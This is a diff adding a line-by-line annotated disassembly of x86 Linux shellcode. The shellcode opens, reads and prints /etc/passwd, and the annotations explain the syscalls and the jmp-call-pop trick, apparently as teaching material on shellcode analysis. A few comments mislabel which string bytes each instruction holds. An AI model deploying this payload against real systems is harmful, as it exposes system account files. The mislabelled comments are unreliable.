@@ -1,0 +1,26 @@
+0x0804a040 <+0>:		  jmp    0x804a078 <code+56>   ; jump to the memory address at "0x804a078"
+0x0804a042 <+2>:		  mov    eax,0x5      ; move 5 into EAX
+0x0804a047 <+7>:		  pop    ebx          ; pop the memory address "0x0804a07d" (placed right after the call instruction) into EBX
+0x0804a048 <+8>:		  xor    ecx,ecx      ; zero out ECX
+0x0804a04a <+10>:	    int    0x80         ; issue the 'open' (5) syscall with EAX containing the value 5, EBX pointing to a memory address containing "/etc/passwd", and ECX containing 0 - the "O_RDONLY" (read-only) access mode
+0x0804a04c <+12>:	    mov    ebx,eax      ; move the returned syscall file descriptor value (3) from EAX into EBX
+0x0804a04e <+14>:	    mov    eax,0x3      ; move 3 into EAX
+0x0804a053 <+19>:	    mov    edi,esp      ; ESP is now pointing to a memory address containing our buffer, so move that address into EDI
+0x0804a055 <+21>:	    mov    ecx,edi      ; move that address from EDI into ECX, the file descriptor will write into that buffer
+0x0804a057 <+23>:	    mov    edx,0x1000   ; move "0x1000" in HEX, which is "4096" in decimal into EDX
+0x0804a05c <+28>:	    int    0x80         ; issue the 'read' (3) syscall with EAX containing the value 3, EBX containing the returned file descriptor (3), ECX pointing to the buffer address and EDX containing the number of bytes (4096) to read from the "/etc/passwd" file
+0x0804a05e <+30>:	    mov    edx,eax      ; place the returned number of bytes read from EAX into EDX
+0x0804a060 <+32>:	    mov    eax,0x4      ; move 4 into EAX
+0x0804a065 <+37>:	    mov    ebx,0x1      ; move 1 into EBX
+0x0804a06a <+42>:	    int    0x80         ; issue the 'write' (4) syscall with EAX containing the value 4, EBX containing the value 1 (file descriptor - STDOUT), ECX containing the address of the buffer (/etc/passwd) to write from and EDX containing the number of bytes (4096) to write up to
+0x0804a06c <+44>:	    mov    eax,0x1      ; move 1 into EAX
+0x0804a071 <+49>:	    mov    ebx,0x0      ; move 0 into EBX
+0x0804a076 <+54>:	    int    0x80         ; issue the 'exit' (1) syscall
+0x0804a078 <+56>:	    call   0x804a042 <code+2>   ; call the instruction at "0x804a042" (jmp-call-pop technique)
+0x0804a07d <+61>:	    das                 ; these aren't the assembly instructions but rather the HEX representation of the "/etc/passwd[null]" string. The HEX opcodes (2F6574632F706173737764) can be seen in the above ndisasm screenshot. So in this case the "das" instruction contains the character "/"  
+0x0804a07e <+62>:	    gs                  ; contains "etc"
+0x0804a07f <+63>:	    je     0x804a0e4    ; contains "/"
+0x0804a081 <+65>:	    das    							; contains "pa"
+0x0804a082 <+66>:	    jo     0x804a0e5    ; contains "ss"
+0x0804a084 <+68>:	    jae    0x804a0f9    ; contains "wd"
+0x0804a086 <+70>:	    ja     0x804a0ec    ; contains the null byte terminator of the string
